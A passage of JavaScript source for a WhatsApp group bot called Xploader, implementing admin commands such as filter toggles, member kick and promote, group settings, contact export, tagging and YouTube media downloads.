            db.data.chats[from].antibot = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antibot = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antiviewonce":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antiviewonce = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiviewonce = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antimedia":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antimedia = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antimedia = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antidocument":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antidocument = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antidocument = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "anticontact":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].anticontact = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].anticontact = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antilocation":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antilocation = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilocation = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antilink":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antilink = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilink = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antilinkgc":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antilinkgc = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antilinkgc = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "welcome":
      case "left":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            welcome = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            welcome = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "adminevent":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            adminevent = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            adminevent = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "groupevent":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            groupevent = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            groupevent = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "invite":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!text)
            return reply(
              `*_Enter the number you want to invite to the group_*\n\nExample :\n*${prefix + command}* 254796180105`
            );
          if (text.includes("+"))
            return reply(`*_Enter the number together without_* *+*`);
          if (isNaN(text))
            return reply(
              `*_Enter only the numbers plus your country code without spaces_*`
            );
          let group = m.chat;
          let link =
            "https://chat.whatsapp.com/" +
            (await Xploader.groupInviteCode(group));
          await Xploader.sendMessage(text + "@s.whatsapp.net", {
            text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`,
            mentions: [m.sender],
          });
          reply(` *_An invite link is sent to the user_* `);
        }
        break;
//=================================================//
      case "closetime":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        if (args[1] == "second") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "minute") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "hour") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "day") {
          var timer = args[0] * `86400000`;
        } else {
          return reply(
            "*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second"
          );
        }
        reply(`Close time ${q} starting from now`);
        setTimeout(() => {
          var nomor = m.participant;
          const close = `*Close time* group closed by admin\nnow only admin can send messages`;
          Xploader.groupSettingUpdate(m.chat, "announcement");
          reply(close);
        }, timer);
        break;
//=================================================//
      case "opentime":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        if (args[1] == "second") {
          var timer = args[0] * `1000`;
        } else if (args[1] == "minute") {
          var timer = args[0] * `60000`;
        } else if (args[1] == "hour") {
          var timer = args[0] * `3600000`;
        } else if (args[1] == "day") {
          var timer = args[0] * `86400000`;
        } else {
          return reply(
            "*select:*\nsecond\nminute\nhour\n\n*example*\n10 second"
          );
        }
        reply(`Open time ${q} starting from now`);
        setTimeout(() => {
          var nomor = m.participant;
          const open = `*Open time* the group was opened by admin\n now members can send messages`;
          Xploader.groupSettingUpdate(m.chat, "not_announcement");
          reply(open);
        }, timer);
        break;
//=================================================//
      case "kick":
      case "remove":
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        let blockwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Xploader.groupParticipantsUpdate(
          m.chat,
          [blockwww],
          "remove"
        );
        reply(mess.done);
        break;
//=================================================//
      case "getcontact":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!(isGroupAdmins || XpBotOwner)) return reply(mess.admin);
          XpBotbigpp = await Xploader.sendMessage(
            m.chat,
            {
              text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`,
            },
            { quoted: m, ephemeralExpiration: 86400 }
          );
          await sleep(1000);
          Xploader.sendContact(
            m.chat,
            participants.map((a) => a.id),
            XpBotbigpp
          );
        }
        break;
//=================================================//
      case "savecontact":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!(isGroupAdmins || XpBotOwner)) return reply(mess.admin);
          let cmiggc = await Xploader.groupMetadata(m.chat);
          let orgiggc = participants.map((a) => a.id);
          vcard = "";
          noPort = 0;
          for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${
              a.id.split("@")[0]
            }\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${
              a.id.split("@")[0]
            }\nEND:VCARD\n`;
          }
          let nmfilect = "./contacts.vcf";
          reply(
            "\nBe patient bro, saving... " +
              cmiggc.participants.length +
              " contact"
          );
          require("fs").writeFileSync(nmfilect, vcard.trim());
          await sleep(2000);
          Xploader.sendMessage(
            m.chat,
            {
              document: require("fs").readFileSync(nmfilect),
              mimetype: "text/vcard",
              fileName: "Contact.vcf",
              caption:
                "\nSucceed\nGroup: *" +
                cmiggc.subject +
                "*\nContact: *" +
                cmiggc.participants.length +
                "*",
            },
            { ephemeralExpiration: 86400, quoted: m }
          );
          require("fs").unlinkSync(nmfilect);
        }
        break;
//=================================================//
      case "sendcontact":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!m.mentionedJid[0])
            return reply(
              "\nUse like this\n Example:.sendcontact @tag|name"
            );
          let snTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let snContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: snTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  snTak +
                  ";;;\nFN:" +
                  snTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          Xploader.sendMessage(
            m.chat,
            { contacts: snContact },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
//=================================================//
      case "contacttag":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!(isGroupAdmins || XpBotOwner)) return reply(mess.admin);
          if (!m.mentionedJid[0])
            return reply(
              "\nUse like this\n Example:.contacttag @tag|name"
            );
          let sngTak = text.split(" ")[1] ? text.split(" ")[1] : "Contact";
          let sngContact = {
            displayName: "Contact",
            contacts: [
              {
                displayName: sngTak,
                vcard:
                  "BEGIN:VCARD\nVERSION:3.0\nN:;" +
                  sngTak +
                  ";;;\nFN:" +
                  sngTak +
                  "\nitem1.TEL;waid=" +
                  m.mentionedJid[0].split("@")[0] +
                  ":" +
                  m.mentionedJid[0].split("@")[0] +
                  "\nitem1.X-ABLabel:Mobile\nEND:VCARD",
              },
            ],
          };
          Xploader.sendMessage(
            m.chat,
            { contacts: sngContact, mentions: participants.map((a) => a.id) },
            { ephemeralExpiration: 86400 }
          );
        }
        break;
//=================================================//
      case "add":
        if (!m.isGroup) return reply(mess.group);
        if (!XpBotOwner) return reply(mess.owner);
        if (!isBotAdmins) return reply(mess.admin);
        let blockwwww = m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Xploader.groupParticipantsUpdate(m.chat, [blockwwww], "add");
        reply(mess.done);
        break;
  //=================================================//
      case "promote":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        let blockwwwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Xploader.groupParticipantsUpdate(
          m.chat,
          [blockwwwww],
          "promote"
        );
        reply(mess.done);
        break;
//=================================================//
      case "demote":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        let blockwwwwwa = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await Xploader.groupParticipantsUpdate(
          m.chat,
          [blockwwwwwa],
          "demote"
        );
        reply(mess.done);
        break;
//=================================================//
      case "setgroupname":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text) return reply("*_Text ?_*");
        await Xploader.groupUpdateSubject(m.chat, text);
        reply(mess.done);
        break;
//=================================================//
      case "userjid":
        {
          if (!XpBotOwner) return reply(mess.owner);
          const groupMetadata = m.isGroup
            ? await Xploader.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`;
          for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`;
          }
          reply(textt);
        }
        break;
//=================================================//
      case "delppgroup":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (!isBotAdmins) return reply(mess.admin);
          await Xploader.removeProfilePicture(from);
        }
        break;
//=================================================//
     case "setppgroup":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!quoted)
          return reply(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        if (!/image/.test(mime))
          return reply(
            `Send/Reply Image Caption Caption ${prefix + command}`
          );
        if (/webp/.test(mime))
          return reply(
            `Send/Reply Image With Caption ${prefix + command}`
          );
        var medis = await Xploader.downloadAndSaveMediaMessage(
          quoted,
          "ppbot.jpeg"
        );
        if (args[0] == "full") {
          var { img } = await generateProfilePicture(medis);
          await Xploader.query({
            tag: "iq",
            attrs: {
              to: m.chat,
              type: "set",
              xmlns: "w:profile:picture",
            },
            content: [
              {
                tag: "picture",
                attrs: {
                  type: "image",
                },
                content: img,
              },
            ],
          });
          fs.unlinkSync(medis);
          reply(mess.done);
        } else {
          var memeg = await Xploader.updateProfilePicture(m.chat, {
            url: medis,
          });
          fs.unlinkSync(medis);
          reply(mess.done);
        }
        break;
//=================================================//
      case "tagall":
      case "tag":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        let me = m.sender;
        let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagged by :*  @${
          me.split("@")[0]
        }\n🌿 *Message : ${q ? q : "no message"}*\n\n`;
        for (let mem of participants) {
          teks += `${themeemoji} @${mem.id.split("@")[0]}\n`;
        }
        Xploader.sendMessage(
          m.chat,
          {
            text: teks,
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
//=================================================//
      case "hidetag":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        Xploader.sendMessage(
          m.chat,
          {
            text: q ? q : "",
            mentions: participants.map((a) => a.id),
          },
          {
            quoted: m,
          }
        );
        break;
//=================================================//
      case "totag":
        if (!m.isGroup) return reply(mess.group);
        if (!isBotAdmins) return reply(mess.admin);
        if (!isAdmins) return reply(mess.admin);
        if (!m.quoted)
          return reply(`Reply media with caption ${prefix + command}`);
        Xploader.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
        break;
//=================================================//
      case "groupmode":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        if (args[0] === "close") {
          await Xploader.groupSettingUpdate(m.chat, "announcement").then(
            (res) => reply(`Success Closing Group`)
          );
        } else if (args[0] === "open") {
          await Xploader.groupSettingUpdate(
            m.chat,
            "not_announcement"
          ).then((res) => reply(`Success Opening Group`));
        } else {
          reply(
            `Mode ${command}\n\n\nUse ${prefix + command}open/close`
          );
        }
        break;
//=================================================//
      case "editinfo":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        if (args[0] === "open") {
          await Xploader.groupSettingUpdate(m.chat, "unlocked").then(
            (res) => reply(`Successfully Opened Edit Group Info`)
          );
        } else if (args[0] === "close") {
          await Xploader.groupSettingUpdate(m.chat, "locked").then((res) =>
            reply(`Successfully Closed Edit Group Info`)
          );
        } else {
          reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`);
        }
        break;
//=================================================//
      case "linkgc":
      case "gclink":
      case "grouplink":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        let response = await Xploader.groupInviteCode(m.chat);
        Xploader.sendText(
          m.chat,
          `👥 *GROUP LINK*\n\n📛 *Name :* ${
            groupMetadata.subject
          }\n\n👤 *Owner Grup :* ${
            groupMetadata.owner !== undefined
              ? "+" + groupMetadata.owner.split`@`[0]
              : "Not known"
          }\n\n🌱 *ID :* ${
            groupMetadata.id
          }\n\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${
            groupMetadata.participants.length
          }\n`,
          m,
          {
            detectLink: true,
          }
        );
        break;
//=================================================//
      case "getbio":
        {
          try {
            let who;
            if (m.isGroup)
              who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
            else who = m.quoted.sender ? m.quoted.sender : m.sender;
            let bio = await Xploader.fetchStatus(who);
            reply(bio.status);
          } catch {
            if (text)
              return reply(
                `bio is private or you haven't replied to the person's message!`
              );
            else
              try {
                let who = m.quoted ? m.quoted.sender : m.sender;
                let bio = await Xploader.fetchStatus(who);
                reply(bio.status);
              } catch {
                return reply(
                  `bio is private or you haven't replied to the person's message!`
                );
              }
          }
        }
        break;
//=================================================//
      case "resetlink":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        await Xploader.groupRevokeInvite(m.chat).then((res) => {
          reply(`Reset Success`);
        });
        break;
//=================================================//
      case "antibadword":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].badword = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].badword = false;
            reply(`${commad} is disabled`);
          }
        }
        break;
//=================================================//
      case "react":
        {
          if (!XpBotOwner) return reply(mess.owner);
          reactionMessage = {
            react: {
              text: args[0],
              key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
            },
          };
          Xploader.sendMessage(m.chat, reactionMessage);
        }
        break;
//=================================================//
      case "nsfw":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args[0] === "on") {
            if (AntiNsfw) return reply("*_Already activated_*");
            ntnsfw.push(from);
            fs.writeFileSync(
              "./src/data/function/nsfw.json",
              JSON.stringify(ntnsfw)
            );
            reply("*_Success in turning on nsfw in this group_*");
            var groupe = await Xploader.groupMetadata(from);
            var members = groupe["participants"];
            var mems = [];
            members.map(async (adm) => {
              mems.push(adm.id.replace("c.us", "s.whatsapp.net"));
            });
            Xploader.sendMessage(
              from,
              {
                text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`,
                contextInfo: { mentionedJid: mems },
              },
              { quoted: m }
            );
          } else if (args[0] === "off") {
            if (!AntiNsfw) return reply("*_Already deactivated_*");
            let off = ntnsfw.indexOf(from);
            ntnsfw.splice(off, 1);
            fs.writeFileSync(
              "./src/data/function/nsfw.json",
              JSON.stringify(ntnsfw)
            );
            reply("*_Success in turning off nsfw in this group_*");
          } else {
            await reply(
              `*_Please Type The Option\n\nExample: ${
                prefix + command
              } on\nExample: ${
                prefix + command
              } off\n\non to enable\noff to disable_*`
            );
          }
        }
        break;
//=================================================//
      case "antiaudio":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antiaudio = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiaudio = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antiforeign":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[m.chat].antiforeignnum = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[m.chat].antiforeignnum = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "poll":
        {
          if (!XpBotOwner) return reply(mess.owner);
          let [poll, opt] = text.split("|");
          if (text.split("|") < 2)
            return await reply(
              `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best player?|Messi,Ronaldo,None...`
            );
          let options = [];
          for (let i of opt.split(",")) {
            options.push(i);
          }
          await Xploader.sendMessage(m.chat, {
            poll: {
              name: poll,
              values: options,
            },
          });
        }
        break;
//=================================================//
      case "antipoll":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antipoll = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antipoll = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antisticker":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antisticker = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antisticker = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antiimage":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antiimage = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antiimage = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antivideo":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antivideo = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antivideo = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
      case "antivirus":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins && !XpBotOwner) return reply(mess.notadmin);
          if (args.length < 1) return reply("*on or off?*");
          if (args[0] === "on") {
            db.data.chats[from].antivirtex = true;
            reply(`${command} is enabled`);
          } else if (args[0] === "off") {
            db.data.chats[from].antivirtex = false;
            reply(`${command} is disabled`);
          }
        }
        break;
//=================================================//
case "ephemeral":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!isBotAdmins) return reply(mess.admin);
          if (!isAdmins) return reply(mess.notadmin);
          if (!text) return reply("Enter the value enable/disable");
          if (args[0] === "on") {
            await Xploader.sendMessage(m.chat, {
              disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL,
            });
            await reply(`*_Done_*`);
          } else if (args[0] === "off") {
            await Xploader.sendMessage(m.chat, {
              disappearingMessagesInChat: false,
            });
            await reply(`*_Done_*`);
          }
        }
        break;
//=================================================//
case "setdesc":
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !XpBotOwner)
          return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text) return reply("*_Please enter a text_*");
        await Xploader.groupUpdateDescription(m.chat, text);
        reply(mess.done);
        break;
//=================================================//
      case "tagadmin":
      case "listadmin":
      case "admin":
        {
          if (!m.isGroup) return reply(mess.group);
          const groupAdmins = participants.filter((p) => p.admin);
          const listAdmin = groupAdmins
            .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
            .join("\n");
          const owner =
            groupMetadata.owner ||
            groupAdmins.find((p) => p.admin === "superadmin")?.id ||
            m.chat.split`-`[0] + "@s.whatsapp.net";
          let text = `   
*Group Admins Here:*
${listAdmin}
`.trim();
          Xploader.sendMessage(
            m.chat,
            { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
            { quoted: fstatus }
          );
        }
        break;
//=====DOWNLOAD MENU CMDS=======================//
case "play":
case "song":
{
	if (!text) return reply('Please provide a song name!');
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
await Xploader.sendMessage(m.chat, {
 audio: {url: kyuu.result.mp3}, 
 mimetype: 'audio/mpeg',
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: `${search.all[0].title}`,
          thumbnailUrl: `${search.all[0].thumbnail}`,
          sourceUrl: `${telaso}`,
          mediaType: 2,
          mediaUrl: `${telaso}`,
        }
      }
    }, { quoted: m });
    Xploader.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
  }
break;
//=================================================//
case "playdoc":
case "songdoc":
{
	if (!text) return reply('Please provide a song name!');
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
await Xploader.sendMessage(m.chat, {
  document: {url: kyuu.result.mp3},
mimetype: "audio/mp3",
 fileName: `${kyuu.result.title}.mp3`,
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: `${search.all[0].title}`,
          thumbnailUrl: `${search.all[0].thumbnail}`,
          sourceUrl: `${telaso}`,
          mediaType: 2,
          mediaType: 2,
          mediaUrl: `${telaso}`,
        }
      }
    }, { quoted: m });
    Xploader.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
  }
break;
//=================================================//
case "video":
{
	if (!text) return reply('Please provide a song/video name!');
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
await Xploader.sendMessage(m.chat, {
 video: {url: kyuu.result.mp4}, 
 caption: `©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭` ,
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: `${search.all[0].title}`,
          thumbnailUrl: `${search.all[0].thumbnail}`,
          sourceUrl: `${telaso}`,
          mediaType: 2,
          mediaType: 2,
          mediaUrl: `${telaso}`,
        }
      }
    }, { quoted: m });
    Xploader.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
  }
break;
//=================================================//
case "videodoc":
{
	if (!text) return reply('Please provide a song/video name!');
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${telaso}`)
await Xploader.sendMessage(m.chat, {
 document: {url: kyuu.result.mp4},
mimetype: "video/mp4",
 fileName: `${search.all[0].title}.mp4`,
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: `${search.all[0].title}`,
          thumbnailUrl: `${search.all[0].thumbnail}`,
          sourceUrl: `${telaso}`,
          mediaType: 2,
          mediaType: 2,
          mediaUrl: `${telaso}`,
        }
      }
    }, { quoted: m });
    Xploader.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
  }
break;
//=================================================//
      case "yts":
      case "ytsearch":
        {
          if (!text)
            return reply(
              `Example : ${prefix + command} Eminem Godzilla`
            );
          let yts = require("yt-search");
          let search = await yts(text);
          let teks = "YouTube Search\n\n Result From " + text + "\n\n";
          let no = 1;
          for (let i of search.all) {
            teks += `□ No : ${no++}\n□ Type : ${
              i.type
            }\n□ Video ID : ${i.videoId}\n□ Title : ${
              i.title
            }\n□ Views : ${i.views}\n□ Duration : ${
              i.timestamp
            }\n□ Uploaded : ${i.ago}\n□ Url : ${
              i.url
            }\n\n─────────────────\n\n`;
          }
          Xploader.sendMessage(
            m.chat,
            { image: { url: search.all[0].thumbnail }, caption: teks },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "gitclone":
        if (!args[0])
          return reply(
            `Where is the link?\nExample :\n${prefix}${command} https://github.com/Dark-Xploit/XPLOADER-BOT`
          );
        if (!isUrl(args[0]))
          return reply("Link invalid! Please provide a valid URL.");
        let regex1 =
          /(?:https|git)(?::\/\/|@)(www\.)?github\.com[\/:]([^\/:]+)\/(.+)/i;
        let [, , user, repo] = args[0].match(regex1) || [];
        if (!repo) {
          return reply(
            "Invalid GitHub link format. Please double-check the provided link."
          );
        }
        repo = repo.replace(/.git$/, "");
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
        let filename = (await fetch(url, { method: "HEAD" })).headers
          .get("content-disposition")
          .match(/attachment; filename=(.*)/)[1];
        Xploader.sendMessage(
          m.chat,
          {
            document: { url: url },
            fileName: filename + ".zip",
